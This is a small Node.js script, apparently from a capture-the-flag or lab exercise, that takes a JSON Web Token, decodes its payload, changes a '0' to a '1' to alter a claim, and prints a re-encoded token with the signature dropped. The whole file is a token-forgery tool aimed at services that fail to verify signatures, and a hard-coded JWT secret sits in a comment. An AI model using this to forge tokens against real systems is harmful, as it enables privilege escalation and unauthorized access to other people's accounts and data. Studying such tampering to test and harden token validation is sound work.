const jwt = require('jsonwebtoken');
const readline = require('readline');

/* const jwtSecret = "mydfs68jlk5620jds7akl8m127a8sdh168hj"; */

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let oldToken;

rl.question('Insert the token: ', (inputString) => {
  console.log(`Token: ${inputString}`);
  oldToken = inputString;

  rl.close();

  handleToken();
});

function handleToken() {

  const separatedToken = oldToken.split('.')

  const header = separatedToken[0];
  const payload = separatedToken[1];
  

  const decodedPayload = Buffer.from(payload, 'base64');
  const modifiedPayload= decodedPayload.toString('utf8').replace("0","1");
  console.log(modifiedPayload)

  const payloadBase64 = Buffer.from(modifiedPayload).toString('base64');

  const newToken = header+"."+payloadBase64
  console.log("New Token:", newToken.replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "."))
 
}
